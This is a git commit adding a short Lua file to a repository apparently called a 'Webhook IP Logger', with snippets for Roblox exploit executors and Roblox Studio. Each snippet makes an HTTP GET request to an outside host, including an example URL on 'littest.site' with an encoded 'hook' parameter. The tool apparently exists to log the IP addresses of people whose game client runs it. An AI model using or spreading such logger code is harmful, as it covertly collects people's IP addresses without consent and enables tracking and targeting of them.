667417b9095a2f5ef7d754f34264c77de26a58ca
fsarewfdfwe <72721526+fsarewfdfwe@users.noreply.github.com>
2021-01-17 15:54:26 +0900

    Add files via upload

---
+++ gdsdsg5-main/Webhook-IP-Logger-master/Roblox.lua
@@ -0,0 +1,6 @@
+-- Exploits
+game:HttpGet("Site Here")
+-- Roblox Studio
+game:GetService("HttpService"):GetAsync("Site Here")
+--Example
+game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==")
